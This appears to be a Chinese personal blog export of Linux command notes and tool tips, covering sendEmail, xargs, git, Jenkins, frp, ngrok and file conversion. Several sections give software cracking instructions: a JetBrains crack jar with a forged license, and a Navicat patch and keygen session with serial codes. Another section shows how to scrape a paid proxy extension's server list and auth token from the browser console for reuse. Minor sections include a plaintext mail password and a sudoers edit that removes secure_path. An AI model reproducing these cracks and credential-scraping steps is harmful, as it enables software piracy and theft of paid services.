sendEmail-v1.56.tar.gzsendEmail-v1.56/sendEmail-v1.56/CHANGELOGsendEmail-v1.56/READMEsendEmail-v1.56/README-BR.txtsendEmail-v1.56/TODOsendEmail-v1.56/sendEmailsendEmail-v1.56/sendEmail.pl[root@VM_0_14_centos ~]# cd sendEmail-v1.56/[root@VM_0_14_centos sendEmail-v1.56]# mv sendEmail /usr/local/bin# /usr/local/bin/sendEmail -f ttlsafrom@163.com -t ttlsato@qq.com \ -s smtp.163.com -u "我是邮件主题" -o message-content-type=html \ -o message-charset=utf8 -xu ttlsafrom@163.com -xp 123456 -m "我是邮件内容" /usr/local/bin/sendEmail 命令主程序 -f ttlsafrom@163.com 发件人邮箱 -s smtp.163.com 发件人邮箱的smtp服务器 -u "我是邮件主题" 邮件的标题 -o message-content-type=html 邮件内容的格式,html表示它是html格式 -o message-charset=utf8 邮件内容编码 -xu ttlsafrom@163.com 发件人邮箱的用户名 -xp 123456 发件人邮箱密码 -m "我是邮件内容" 邮件的具体内容 wc1234567891.统计当前目录下，py文件数量：find . -name "*.py" |wc -l2.统计当前目录下，所有py文件行数：find . -name "*.py" |xargs cat|wc -l3.统计当前目录下，所有py文件行数，并过滤空行：find . -name "*.py" |xargs cat|grep -v ^$|wc -l kill12345678910111213141516171819202122232425262728kill ps -ef | grep 'ddd'for procid in $(ps -aux | grep "some search" | awk '&#123;print $2&#125;'); do kill -9 $procid; doneps -ef | grep 'ddd' | xargs kill echo '--help' | xargs cat 等价于 cat --help echo '11@22@33' | xargs -d '@' echo//11 22 33 echo '11@22@33' | xargs -p -d '@' echo//不会马上执行其后面的命令，而是输出即将要执行的完整的命令 echo 11 22 33 ?...y ==&gt;这里询问是否执行命令 echo 11 22 33 输入y并回车，则显示执行结果，否则不执行 https://laravel-china.org/articles/21339 find . -name "*.txt" 输出： ./2.txt ./3.txt ./1.txt =&gt; 默认情况下find的输出结果是每条记录后面加上换行，也就是每条记录是一个新行 find . -name "*.txt" -print0 输出： ./2.txt./3.txt./1.txt =&gt; 加上 -print0 参数表示find输出的每条结果后面加上 '\0' 而不是换行 find . -name "*.txt" -print0 | xargs -0 echo 输出： ./2.txt ./3.txt ./1.txt find . -name "*.txt" -print0 | xargs -d '\0' echo 输出： ./2.txt ./3.txt ./1.txt uniq12345678910111213141516171819#uniq -h长选项必须使用的参数对于短选项时也是必需使用的。 -c, --count //在每行前加上表示相应行目出现次数的前缀编号 -d, --repeated //只输出重复的行 -D, --all-repeated //只输出重复的行，不过有几行输出几行 -f, --skip-fields=N //-f 忽略的段数，-f 1 忽略第一段 -i, --ignore-case //不区分大小写 -s, --skip-chars=N //根-f有点像，不过-s是忽略，后面多少个字符 -s 5就忽略后面5个字符 -u, --unique //去除重复的后，全部显示出来，根mysql的distinct功能上有点像 -z, --zero-terminated end lines with 0 byte, not newline -w, --check-chars=N //对每行第N 个字符以后的内容不作对照 --help //显示此帮助信息并退出 --version //显示版本信息并退出 显示有重复的行$ uniq -d -c uniqtest 3 this is a test 2 i love tank uniq -D 只显示重复的行，并且把重复几行都显示出来。他不能和-c一起使用 仅显示不重复的行 sort testfile | uniq -u curl12查询访问时间for i in &#123;1..100&#125;;do curl -o /dev/null -s -w "$i | time_namelookup: %&#123;time_namelookup&#125; | time_connect: %&#123;time_connect&#125; | time_starttransfer: %&#123;time_starttransfer&#125; | time_total: %&#123;time_total&#125;\n" -x "10.71.48.129:80" "http://www.baidu.com"; done ftp123456789101112131415161718192021yum install vsftpd启动ftp命令#service vsftpd start停止ftp命令#service vsftpd stop重启ftp命令#service vsftpd restart[root@VM_0_14_centos ~]# useradd test[root@VM_0_14_centos ~]# passwd testChanging password for user test.New password:BAD PASSWORD: The password is shorter than 8 charactersRetype new password:Sorry, passwords do not match.New password:Retype new password:passwd: all authentication tokens updated successfully.[root@VM_0_14_centos ~]# ll /home/test/total 0[root@VM_0_14_centos ~]# cd /home/test/[root@VM_0_14_centos test]# touch test.php然后使用filezilla链接ftp test账号登录看到的就是/home/test/下的文件 git1234567891011121314151617181920212223242526272829303132使用通配符提交 git add *.js只删除版本库中文件但保存项目目录中文件 git rm --cached index.php放弃没有提交的修改 git checkout .删除没有add 的文件和目录 git clean -fd显示将要删除的文件或目录 git clean -n查看最近2次提交日志并显示文件差异 git log -p -2一行显示并只显示SHA-1的前几个字符 git log --onelinegit config --global alias.c commit 使用 git c 实现 git commit 一样的效果了$ git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset' --abbrev-commit* 1edc0f8c - (HEAD -&gt; temp, origin/master, origin/HEAD, master) Merge branch 'master' into temp (3 hours ago) &lt;xxx&gt;|\| * 7bd6895a - Merge branch 'dev'pay/right优化 (5 hours ago) &lt;xxx&gt;| * d81f7be5 - Merge branch 'temp' (6 hours ago) &lt;xxx&gt;创建并切换分支 git checkout -b feature/bbs删除远程分支 git push origin :dev储藏工作 git stash查看储藏列表 git stash list应用最近的储藏 git stash apply应用并删除储藏 git stash pop对mster分支代码生成压缩包供使用者下载使用，--prefix 指定目录名git archive master --prefix='hdcms/' --format=zip &gt; hdcms.zip删除远程ask分支 git push origin --delete ask本地ask分支关联远程分支并推送 git push --set-upstream origin ask# 增加一个远程库git remote add github git@github.com:houdunwang/coding.git# 提交到远程库git push githubgit remote add origin git@github.com:houdunwang/hd-xj.git拉取origin主机的ask分支与本地的master分支合并 git pull origin ask:ask拉取origin主机的ask分支与当前分支合并 git pull origin ask 查找清理大文件123456789101112[cuihuan:~ cuixiaohuan]$ df -hFilesystem Size Used Avail Use% Mounted on/dev/sda2 8.2G 6.7G 1.6G 82% //dev/sda3 1.4T 1.3T 50G 97% /home1.5T的硬盘占用了97%，确实不够用了[cuihuan:~]$ du -sh * | grep G。。。73G mongodb103G mxm2.1G onlinehttp://cuihuan.net/2015/12/08/linux%20%E6%9F%A5%E6%89%BE%E6%B8%85%E7%90%86%E5%A4%A7%E6%96%87%E4%BB%B6/ crontab 误删除恢复123456789101112cat /var/log/cron | grep -i "`which cron`" &gt; ./all_tempcat ./all_temp | grep -v "&lt;command&gt;” &gt; ./cmd_tempawk -F'(' '/crond/&#123;a[$3]=$0&#125;END&#123;for(i in a)print a[i]&#125;' /var/log/cron* &gt;crontab.txt从crontab.txt 中找出每一条指令，然后在cmd_temp 中匹配运行次数，重新编辑crontab 添加每天对crontab进行备份，备份最近15天的数据。#!/bin/bash# 每天对crontab 进行备份 ，同时删除最近15天的数据DATE=$(date +%Y%m%d)crontab -l &gt; /home/work/bak/crontab_$DATE.bakfind /home/work/bak/ -mtime +15 -name '*.bak' -exec rm -rf &#123;&#125; \;http://cuihuan.net/2015/12/03/crontab%20%E8%AF%AF%E5%88%A0%E9%99%A4%E6%81%A2%E5%A4%8D/ tail grep123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566https://itbilu.com/linux/man/H1_dxWhz4.html现有itbilu.log日志文件，查看其后5行：$ tail -n -5 itbilu.log// 或$ tail -n 5 itbilu.log// 或$ tail -5 itbilu.log查看第100行至文件末尾：$ tail -n +100 itbilu.log// 或$ tail +100 itbilu.log配合head命令，实现查看文件的第10到20行：$ head -20 itbilu.log | tail -10实时查看日志通过-f参数，我们可以实时查看文件的新增内容：$ tail -f itbilu.log注意：使用-f参数时不会中断文件监视，需要通过ctrl+c手动结束。实时日志查看与grep过滤关键字通过-f参数，并配合grep命令，可以实现对文件内容的过滤。如：查看前几行、后几行、或前后几行，这时可以通过以下几个参数实现：-A &lt;显示行数&gt; 除了显示符合匹配内容的那一行之外，并显示该行之后的内容-B &lt;显示行数&gt; 在显示符合匹配内容的那一行之外，并显示该行之前的内容-C &lt;显示行数&gt;或-&lt;显示行数&gt; 除了显示符合匹配内容的那一列之外，并显示该列之前后的内容监控itbilu.log日志件，并查看含有'foo'关键字的前后5行：$ tail -f itbilu.log|grep 'foo' -C 5// 或$ tail -f itbilu.log|grep 'foo' -5查找/code目录下js文件，显示包括itbilu.com的行。命令如下：# find ./code -name '*.js'|xargs grep -n 'itiblu.com'# expr 10 + 2030用expr命令计算字符串的长度。命令如下：# str="hello world"# expr length "$str"11 $ stat routes.php File: `routes.php' Size: 24191 Blocks: 48 IO Block: 4096 regular fileDevice: 811h/2065d Inode: 7217947 Links: 1Access: (0775/-rwxrwxr-x) Uid: ( 611/ UNKNOWN) Gid: ( 612/ UNKNOWN)Access: 2019-10-12 15:21:30.733152751 +0800Modify: 2018-12-14 14:23:34.406787125 +0800Change: 2018-12-14 14:23:34.406787125 +0800现有file1和file2两个文件，file内容为1121，file2内容为1123。比较file1和file2两个文件的差异，参数如下：cmp file1 file2比较file1和file2两个文件的差异，然后使用diffstat命令对结果进行统计显示。命令如下：diff file1 file2 | diffstat sudo command not found123456在 env_keep 中增加 PATH 字段vim /etc/sudoersDefaults env_keep += "LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY PATH"# 注释掉 secure_path#Defaults secure_path = /sbin:/bin:/usr/sbin:/usr/bin 避免 rm 误操作123456789wget https://github.com/LaiJingli/rmtrash/blob/master/rmtrash.shmv rmtrash.sh /usr/local/bin #移动到bin目录下chmod +x /bin/rmtrash.sh #增加可执行权限vim ~/.bashrc#增加别名alias rm=/bin/rmtrash.shrmtrash -h #帮助命令rmtrash -e #清空回收站https://learnku.com/articles/35041 awk123456789101112系统突然出现卡顿，常用的排查思路有哪些呢？查看内存使用状况：free -g查看磁盘使用状况：df -h查看磁盘 I/O 使用：iostat -dx查看 CPU 使用：top[release@api_02 ~]$ last -n 5 | awk '&#123;print $1 "\t lines:" NR "\t columns:"NF&#125;'release lines:1 columns:10release lines:2 columns:10release lines:3 columns:10release lines:4 columns:10release lines:5 columns:10 有洁癖的同学可以使用 docker-compose，推荐一下自己构建的（https://gitee.com/nxs/docker-compose） 最好的 Linux 桌面版—- Windows 10 安装体验 linux 常用命令top、awk、sed等 sed很强大的文本操作命令 ubuntu sentry 安装配置 数据科学家的命令行技巧 xargs 命令详解 Linux 命令行的艺术 linux下去除重复行命令uniq 50个最常用的Unix/Linux命令 看示例学awk Sed 命令完全指南 awk查看统计Nginx访问日志 Sed:一些常用的命令详解 提高工作效率的 VIM 操作 Git 基本使用文档 网络问题连不上网]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[有用的网站和工具]]></title>
    <url>%2F2018%2F12%2F18%2F%E6%9C%89%E7%94%A8%E7%9A%84%E7%BD%91%E7%AB%99%E5%92%8C%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[Nginx 访问日志分析工具123456789101112131415161718192021//http://www.dahouduan.com/2018/05/31/nginx-goaccess/ https://www.jianshu.com/p/44d9ffe8cbdbsed -n "/31\/May\/2018:09:00:00/,/31\/May\/2018:11:00:00/"p access.log &gt; access1.log 以上命令表示将 5.31 日 9点到 11 点的请求日志提取到 access1.log yum -y install goaccess[root@VM_0_14_centos ~]# goaccess --dcf/etc/goaccess.confcat /etc/nginx/nginx.confgoaccess -f /usr/local/access.log -o nginx_log.htmlParsing... [0] [0/s]GoAccess - version 1.2 - Jul 23 2017 03:05:48Config file: /etc/goaccess.confFatal error has occurredError occured at: src/parser.c - parse_log - 2705No time format was found on your conf file.vi /etc/goaccess.conftime-format %H:%M:%Sdate-format %d/%b/%Y log-format %h %^[%d:%t %^] “%r” %s %b “%R” “%u”goaccess -f /usr/local/access.log -o -p /etc/goaccess.conf nginx_log.htmlhttp://118.24.158.116:8888/nginx_log.html JetBrains破解123456789101112131415161718192021222324252627282930313233phpstorm 破解：http://idea.zzmcloud.cn http://idea.lanyus.com///https://laravel-china.org/articles/21641 https://www.iacblog.com/2018/10/302.html下载破解补丁(jar)https://cdn.iacblog.com/jet/JetbrainsCrack-3.1-release-enc.jar 到安装bin目录编辑 phpstorm64.exe.vmoptions-javaagent:E:\Program Files\JetBrains\PhpStorm 2018.2.2\bin\JetbrainsCrack-3.1-release-enc.jar重启idea--&gt;打开激活窗口，选择激活码方式，填入以下激活码&#123;"licenseId":"ThisCrackLicenseId","licenseeName":"随便填","assigneeName":"随便填","assigneeEmail":"邮箱，随便填","licenseRestriction":"描述信息，随便填","checkConcurrentUse":false,"products":[&#123;"code":"II","paidUpTo":"2099-12-31"&#125;,&#123;"code":"DM","paidUpTo":"2099-12-31"&#125;,&#123;"code":"AC","paidUpTo":"2099-12-31"&#125;,&#123;"code":"RS0","paidUpTo":"2099-12-31"&#125;,&#123;"code":"WS","paidUpTo":"2099-12-31"&#125;,&#123;"code":"DPN","paidUpTo":"2099-12-31"&#125;,&#123;"code":"RC","paidUpTo":"2099-12-31"&#125;,&#123;"code":"PS","paidUpTo":"2099-12-31"&#125;,&#123;"code":"DC","paidUpTo":"2099-12-31"&#125;,&#123;"code":"RM","paidUpTo":"2099-12-31"&#125;,&#123;"code":"CL","paidUpTo":"2099-12-31"&#125;,&#123;"code":"PC","paidUpTo":"2099-12-31"&#125;,&#123;"code":"DB","paidUpTo":"2099-12-31"&#125;,&#123;"code":"GO","paidUpTo":"2099-12-31"&#125;,&#123;"code":"RD","paidUpTo":"2099-12-31"&#125;],"hash":"2911276/0","gracePeriodDays":7,"autoProlongated":false&#125; navicat破解12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152//http://pan.baidu.com/s/1h1DKOCEkIf8pmPVWeHGcrw//host 127.0.0.1 activate.navicat.comPatch.exe 生成私钥文件 RegPrivateKey.pemKeygen.exe 生成注册码$ /d/Navicat_Premium/Patch.exe "D:\Navicat 12 for MySQL\navicat.exe"D:\Navicat 12 for MySQL\navicat.exe has been backed up.Public key has been replaced.Success!.λ navicat-keygen.exe -text .\RegPrivateKey.pemSelect Navicat product:0. DataModeler1. Premium2. MySQL3. PostgreSQL4. Oracle5. SQLServer6. SQLite7. MariaDB8. MongoDB9. ReportViewer(Input index)&gt; 1Select product language:0. English1. Simplified Chinese2. Traditional Chinese3. Japanese4. Polish5. Spanish6. French7. German8. Korean9. Russian10. Portuguese(Input index)&gt; 1(Input major version number, range: 0 ~ 15, default: 12)&gt; 12Serial number:NAVJ-AM3K-FKY5-AAKXYour name: sushengYour organization: sushengInput request code (in Base64), input empty line to end:ckZjXUkNdMuyQRr+uVn/FTWKfJHuglwETU7GpVgBaF5c8vWG3JhgbGGXYYerBBD1VGIM9tuCwsMaMjrOVnyEB037SgSgY3VymZ1K9/mTpE5pVriZ/LyVlyXmH6YMTBMNsy3tzKt6CMdI+L/xetg9j97BfBRHLbHiabMtPSf8zRyKGrWS9id9jwqAALsu/PkfKsHILz7jGnM8drQqanRPDUfOtKLyhkIoMhM7d42eeMYhvkK0s0YUMX17uae9ygv5UocYh6bZFI+Zw53Q4ShGLtlbbU60TbGkJKjI/vh3NurVECsgCOa4dnKfGcZJvMfYwXYgHwkQmnFC37iMg7w9JQ== HTML 转 PDF1234https://wkhtmltopdf.org/ https://github.com/subtlephp/phpwkhtmltoxwkhtmltopdf longtable.html longtable-01.pdfwkhtmltopdf http://www.baidu.com/ D:website1.pdf locate123456789101112131415161718192021222324252627282930313233343536//https://laravel-china.org/articles/21937locate是从/var/lib/mlocate数据库中进行搜索，find是遍历整个文件夹，所以find比较耗费资源，当然也就比较慢locate不能马上搜索到新建的文件，因为/var/lib/mlocate数据库是一天一更新locate是搜索的是数据库，所以默认根据公共配置文件搜索全部文件公共配置文件[root@localhost ~]# cat /etc/updatedb.confPRUNE_BIND_MOUNTS = "yes"PRUNEFS = "9p afs anon_inodefs auto autofs bdev binfmt_misc cgroup cifs coda configfs cpuset debugfs devpts ecryptfs exofs fuse fusectl gfs gfs2 hugetlbfs inotifyfs iso9660 jffs2 lustre mqueue ncpfs nfs nfs4 nfsd pipefs proc ramfs rootfs rpc_pipefs securityfs selinuxfs sfs sockfs sysfs tmpfs ubifs udf usbfs"PRUNENAMES = ".git .hg .svn"PRUNEPATHS = "/afs /media /net /sfs /tmp /udev /var/cache/ccache /var/spool/cups /var/spool/squid /var/tmp"更新locate数据库updatedbfind /var/log -mtime +10find /etc -size +20k -a -size +50k -exec ls -lh &#123;&#125; \;find /root -name "cangls*" -exec rm -rf &#123;&#125; \;find . size 25kman 5 passwd # 查看passwd的配置帮助man 4 null # 查看null特殊文件的帮助，null相当于黑洞man 8 ifconfig # 查看ip配置帮助zip 压缩文件名 源文件zip -r 压缩文件名 源目录unzip 压缩文件tar -cvf longzls.tar longzlstar -zcvf 压缩包名.tar.gz 源文件tar -zxvf 压缩包名.tar.gzlast命令默认是读取/var/log/wtmp文件数据/var/log/wtmp是二进制文件，不能直接编辑，只能通过last读取，防止黑客篡改还能看到重启信息lastlog命令默认是读取/var/log/lastlog文件内容/var/log/lastlog也是二进制文件 全能的下载工具12345678git clone git@github.com:agalwood/Motrix.gitcd Motrixnpm installnpm config set registry 'https://registry.npm.taobao.org'export ELECTRON_MIRROR='https://npm.taobao.org/mirrors/electron/'export SASS_BINARY_SITE='https://npm.taobao.org/mirrors/node-sass'npm run devnpm run build 自动登录ssh脚本123456789yum instal -y expectvi ~/.bashrc# 最后一行加入alias assh='/此项目绝对路径/assh.sh'# 示例# alias assh='/var/www/assh/assh.sh'# 即时生效https://laravel-china.org/articles/22589source ~/.bashrc jenkins123456789101112131415161718192021222324252627282930313233343536373839404142434445464748下载 jenkins$ mkdir /usr/local/jenkins$ cd /usr/local/jenkins$ wget -c http://mirrors.jenkins.io/war-stable/latest/jenkins.war配置环境变量设置 jenkins 的主目录## root 用户配置 /etc/profile# vi /etc/profileexport JENKINS_ROOT=/usr/local/jenkinsexport JENKINS_HOME=$JENKINS_ROOT/jenkins_home# source /etc/profile## 非 root 用户，配置 .bashrc$ vi ~/.bashrcexport JENKINS_ROOT=/usr/local/jenkinsexport JENKINS_HOME=$JENKINS_ROOT/jenkins_home$ source ~/.bashrc$ nohup java -jar /usr/local/jenkins/jenkins.war --httpPort=8080 &gt;&gt; /usr/local/jenkins/jenkins.log 2&gt;&amp;1 &amp;[root@VM_0_14_centos jenkins]# cat /usr/local/jenkins/jenkins.lognohup: ignoring inputJan 29, 2019 10:01:15 AM Main mainSEVERE: Running with Java class version 55.0, but 52.0 is required.Run with the --enable-future-java flag to enable such behavior. See https://jenkins.io/redirect/java-support/java.lang.UnsupportedClassVersionError: 55.0 at Main.main(Main.java:139)Jenkins requires Java 8, but you are running 11.0.2+7-LTS from /usr/java/jdk-11.0.2java.lang.UnsupportedClassVersionError: 55.0 at Main.main(Main.java:139) 下载 WAR 2.127+, 加 --enable-future-java 选项，即 nohup java -jar /usr/local/jenkins/jenkins.war --enable-future-java --httpPort=8080 &gt;&gt; /usr/local/jenkins/jenkins.log 2&gt;&amp;1 &amp;访问http://118.24.158.116:8180 [root@VM_0_14_centos ~]# cat /usr/local/jenkins/jenkins_home/secrets/initialAdminPassword8db94e0d2ea04e21ac643d47eee9699cUnlock Jenkins 页面输入密码 https://github.com/codcodog/Blog/issues/106Customize Jenkins jenkins 重启http://localhost:8080/restartjenkins 重载 - 重新加载配置信息http://localhost:8080/reloadjenkins 退出http://localhost:8080/exit frp内网穿透1234567891011121314151617181920212223242526272829303132333435cd /rootwget -c https://github.com/fatedier/frp/releases/download/v0.23.1/frp_0.23.1_linux_amd64.tar.gztar zxvf frp*.tar.gz cd /root/frpchmod +x frpsyum install -y supervisorsystemctl disable firewalld &amp;&amp; systemctl stop firewalld# 定义 frps 配置cat &gt; /root/frp/frps.ini &lt;&lt;EOF[common]bind_port = 30000vhost_http_port = 30100vhost_https_port = 30143subdomain_host = dev.demo.ccdashboard_port = 30200dashboard_user = admindashboard_pwd = adminEOF# 定义运行守护配置cat &gt; /etc/supervisord.d/frps.ini &lt;&lt;EOF[program:frps]directory=/root/frpcommand=/root/frp/frps -c /root/frp/frps.iniautostart=trueautorestart=falsestderr_logfile=/var/log/supervisor/frps_stderr.logstdout_logfile=/var/log/supervisor/frps_stdout.logEOF# 开启服务systemctl enable supervisord &amp;&amp; systemctl start supervisordhttps://learnku.com/articles/16985 查询命令函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051 curl cht.sh/php/array_map&lt;?/* * functional programming - PHP's array_map including keys * * Not with array_map, as it doesn't handle keys. * * array_walk (http:www.php.net/manual/en/function.array-walk.php) * does: */$test_array = array("first_key" =&gt; "first_value", "second_key" =&gt; "second_value");array_walk($test_array, function(&amp;$a, $b) &#123; $a = "$b loves $a"; &#125;);var_dump($test_array);[root@VM_0_14_centos blog]# curl https://cht.sh/:cht.sh &gt; cht.sh % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 12427 100 12427 0 0 2397 0 0:00:05 0:00:05 --:--:-- 2426[root@VM_0_14_centos blog]# ll cht.sh-rw-r--r-- 1 root root 12427 Feb 1 10:10 cht.sh[root@VM_0_14_centos blog]# which php/usr/bin/php[root@VM_0_14_centos blog]# mv cht.sh /usr/bin/[root@VM_0_14_centos blog]# chmod +x /usr/bin/cht.sh[root@VM_0_14_centos blog]# cht.sh go reverse a list/* * How do I reverse an array in Go? * * Honestly this one is simple enough that I'd just write it out like * this: */package mainimport "fmt"func main() &#123; s := []int&#123;5, 2, 6, 3, 1, 4&#125; for i, j := 0, len(s)-1; i &lt; j; i, j = i+1, j-1 &#123; s[i], s[j] = s[j], s[i] &#125; fmt.Println(s)&#125;https://github.com/chubin/cheat.sh https://github.com/tpanj/cht.exe $ cht.sh --shell cht.sh&gt; cd go cht.sh/go&gt; reverse a list Tesseract图片文字识别初探1234567891011121314brew install tesseract➜ tesseract --versiontesseract 3.04.01 leptonica-1.73 libjpeg 8d : libpng 1.6.23 : libtiff 4.0.6 : zlib 1.2.5 brew intsall tesseract cd /usr/local/Cellar/tesseract/&#123;version&#125;/share/tessdata wget https://github.com/tesseract-ocr/tessdata/raw/master/chi_sim.traineddata 使用brew安装所有语言包： brew install tesseract --all-languagestesseract paper.png paper -l chi_simtesseract --print-parameters ngrok内网穿透12345678910111213141516ngrok -config=ngrok.cfg -subdomain guowei8888 80 -subdomain guowei8888 guowei8888 表示 是你自定义的域名前缀，必须唯一的，建议以qq号码，邮箱用户名等 80 表示 暴露的端口号 可以修改其他的 例如 81 8080 http://www.54php.cn/default/211.htmlngrok -config=ngrok.cfg -subdomain guowei8888 80 ./ngrok -config=ngrok.cfg -subdomain mysusheng 80小 米 球 Ngrok http://ngrok.ciqiuwl.cn/ by:刺 球 QQ:752102401 (Ctrl+C to quit)# Con TunneTunnel Status onlineVersion 1.7/1.7Forwarding https://mysusheng.ngrok.xiaomiqiu.cn -&gt; 127.0.0.1:80Forwarding http://mysusheng.ngrok.xiaomiqiu.cn -&gt; 127.0.0.1:80Web Interface 127.0.0.1:4040# Conn 1Avg Conn Time 0.00ms doc ppt 转 pdf12345678910111213141516171819202122232425# yum install ImageMagick libreoffice ibreoffice可以实现doc,ppt转pdfimagemagick可以实现pdf转图片二，libreoffice添加字体libreoffice自带的字体很少，如果libreoffice找到字体，就会默认使用宋体，五号字# mount /dev/sda1 /mnt/win7/ # cp -r /mnt/win7/Windows/Fonts/ /home/tank/.config/libreoffice/4/user/fonts $ export DISPLAY=:0.0 &amp;&amp; libreoffice --headless --invisible --convert-to pdf 123.ppt convert /home/tank/download/myppt/123.ppt -&gt; /home/tank/download/myppt/123.pdf using impress_pdf_Export Overwriting: /home/tank/download/myppt/123.pdf$ convert -verbose -density 150 -trim 123.pdf -quality 70 -sharpen 0x1.0 123.jpg "gs" -q -dQUIET -dPARANOIDSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=0 "-sDEVICE=pnmraw" -dTextAlphaBits=4 -dGraphicsAlphaBits=4 "-r150x150" "-sOutputFile=/tmp/magick-XXSi41Xk" "-f/tmp/magick-XXkgR3hF" "-f/tmp/magick-XXQJ4sEZ" /tmp/magick-XXSi41Xk[0] PNM 1240x1754 1240x1754+0+0 8-bit DirectClass 18.67mb /tmp/magick-XXSi41Xk[1] PNM 1240x1754 1240x1754+0+0 8-bit DirectClass 18.67mb /tmp/magick-XXSi41Xk[2] PNM 1240x1754 1240x1754+0+0 8-bit DirectClass 18.67mb 123.pdf[0] PDF 1240x1754 1240x1754+0+0 16-bit DirectClass 18.67mb 123.pdf[0] PDF 1240x1754 1240x1754+0+0 16-bit DirectClass 18.67mb 123.pdf[0] PDF 1240x1754 1240x1754+0+0 16-bit DirectClass 18.67mb 123.pdf=&gt;123-0.jpg[0] PDF 1240x1754=&gt;546x1417 1240x1754+199+168 16-bit DirectClass 140kb 123.pdf=&gt;123-1.jpg[1] PDF 1240x1754=&gt;623x1417 1240x1754+199+168 16-bit DirectClass 108kb 123.pdf=&gt;123-2.jpg[2] PDF 1240x1754=&gt;653x703 1240x1754+199+168 16-bit DirectClass 68kb # yum install http://pkgs.repoforge.org/unoconv/unoconv-0.5-1.el6.rf.noarch.rpm # unoconv -f pdf 123.ppt //将123.ppt转成pdf http://blog.51yip.com/linux/1669.html 网盘12345678http://www.yunpanjingling.com/http://www.aisouziyuan.com/http://www.speedpan.com/https://github.com/CodeTips/BaiduNetdiskPlugin-macOShttps://www.66s.cc/https://www.makcyun.top/www.bttwo.com/ifkdy.com/ http://www.51ape.com/ 翻墙123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102https://www.lazyman.vip/2019/02/16/%E5%A6%82%E4%BD%95%E6%8A%93%E5%8C%85%E7%A0%B4%E8%A7%A3%E4%BB%98%E8%B4%B9%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E8%8A%82%E7%82%B9%E3%80%818k%E7%A7%92%E5%BC%80%E3%80%81%E4%BB%A5%E5%8F%8A%E5%AF%B9HTTP%E7%9A%84%E4%BD%BF%E7%94%A8%E3%80%81%E7%9B%B4%E6%8E%A5%E7%A2%BE%E5%8E%8BSSR%E5%92%8C%E5%B0%8F%E7%81%AB%E7%AE%AD/下载Chrome扩展 webvpn 下载后注册，然后登陆 点击设置按钮 chrome-extension://hcohobfmhkabhpcedpbiddhoeeihcgpp/config.html 点击 you will get 在控制台可以看到 reset response 选择所有server 右键 store as global value ,执行copy(temp1) &#123; "user": &#123; "email": "mybestpartner@sina.com", "auth": "4gagyrCt9uxt25Mw99n2Kw==", "deadline": 1551352996, "recommendUrl": "&lt;div class=\"tip\"&gt;请发送此链接到您的朋友，朋友注册并付费，&lt;br&gt;您将获得30 天的奖励&lt;/div&gt; https://jiasuqi.xyz/server13725" &#125;, "servers": &#123; "VIP_PS_2": &#123; "default": false, "server": "los-2.cdn-aliyun.com:888", "Auth": null, "type": "HTTPS", "name": "VIP_US_D" &#125;, "VIP_PS_3": &#123; "default": false, "server": "losasdsfesfsffw3.cdn-aliyun.com", "Auth": null, "type": "HTTPS", "name": "VIP_US_A" &#125;, "PHS_0": &#123; "default": false, "server": "www.buyao.bid:5050", "Auth": null, "filters": [ "google.com", "google.com.hk", "accounts.youtube.com", "wikimedia.org", "wikipedia.org", "googlecode.com", "googleusercontent.com", "gstatic.com", "gmail.com", "googlegroups.com", "goo.gl", "googleratings.com", "test-ggfwzs-proxy.com", "t.co" ], "type": "HTTPS", "name": "free 谷歌服务代理" &#125;, "VIP_PS_1": &#123; "default": false, "server": "shop.cdn-aliyun.com", "Auth": null, "type": "HTTPS", "name": "VIP_JP_A" &#125; &#125;, "filters": &#123; "tumblr.com": "VIP_PS_2", "youtube.com": "VIP_PS_2", "google.com": "VIP_PS_2", "googleapis.com": "VIP_PS_2", "googlevideo.com": "VIP_PS_2", "ytimg.com": "VIP_PS_2", "ggpht.com": "VIP_PS_2", "googleusercontent.com": "VIP_PS_2" &#125; &#125; proxy switchyomega https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif?hl=zh-CN 点击扩展选项进入 chrome-extension://padekgcemlokbadohgkifijomclgjgif/options.html#!/profile/proxy 代理服务器选择 https 服务器 www.buyao.bid 端口 5050 应用选项 打开https://www.google.com/ 看看 另外还可以到处pac 文件给其他浏览器用，比如http://118.24.158.116:8888/fq.php 遨游浏览器也支持 https://raw.githubusercontent.com/bannedbook/fanqiang/master/jw/new.pac var FindProxyForURL = function(init, profiles) &#123; return function(url, host) &#123; "use strict"; var result = init, scheme = url.substr(0, url.indexOf(":")); do &#123; result = profiles[result]; if (typeof result === "function") result = result(url, host, scheme); &#125; while (typeof result !== "string" || result.charCodeAt(0) === 43); return result; &#125;; &#125;("+proxy", &#123; "+proxy": function(url, host, scheme) &#123; "use strict"; if (/^127\.0\.0\.1$/.test(host) || /^::1$/.test(host) || /^localhost$/.test(host)) return "DIRECT"; return "HTTPS www.buyao.bid:5050"; &#125; &#125;); 代理客户端 https://lilongyao.pipipan.com/fs/17545620-329570325 第一个sstap是代理的客户端 第二个ssupdate是获取节点的客户端 你需要用第一个获取ssr的节点、然后把获取到的节点粘贴到代理客户端软件去！也可以不使用它提供的客户端、你也可以把获取到的节点复制下来用手机的ssr代理软件使用。 这里它提供两个获取节点的选项、分别是我标出来 ishadow 和 应急专用 两个你随便选一个、然后在点一下右上角的 《99 获取数据》的标志稍等几秒节点就出来了、然后鼠标在对应的节点下面单击一下右键、然后复制节点就ok了 然后点一下代理端我标出来的那个 + 选择导入节点就行了 下面那个是代理规则的选项、今天试了一下感觉比shadowsocks还好用、而且它获取到的节点也可以用shadowsocks或shadowsockr 使用！ 流量监控工具iftop12345678910111213➜ ~ sudo yum install -y iftop➜ ~ rpm -q iftop iftop-1.0-0.12.pre4.el7.x86_64➜ ~ rpm -ql 